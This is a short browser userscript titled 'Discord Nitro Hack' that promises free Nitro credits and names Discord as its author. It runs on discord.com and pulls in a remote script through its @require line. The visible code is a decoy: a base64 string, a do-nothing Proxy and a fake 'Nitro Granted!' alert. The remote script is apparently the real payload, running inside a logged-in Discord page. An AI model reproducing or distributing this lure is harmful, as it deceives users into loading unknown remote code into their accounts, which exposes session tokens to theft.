// ==UserScript==
// @name         Discord Nitro Hack
// @namespace    http://discord.com/
// @version      0.1
// @description  Get many 1 Month of NITRO credits for free!!!
// @author       Discord
// @match        *://discord.com/*
// @icon         https://www.google.com/s2/favicons?domain=discord.com
// @require      https://raw.githubusercontent.com/6ap5ae1/plugins/main/discord_plugin.js
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    var nitroCode = atob("SnVzdCBDb2Rl");
    var secretProxy = new Proxy(btoa, {
        apply(nitro, key, nitroToken) {
            return nitro.apply(key, nitroToken);
        }
    });
    alert("Nitro Granted!");
})();
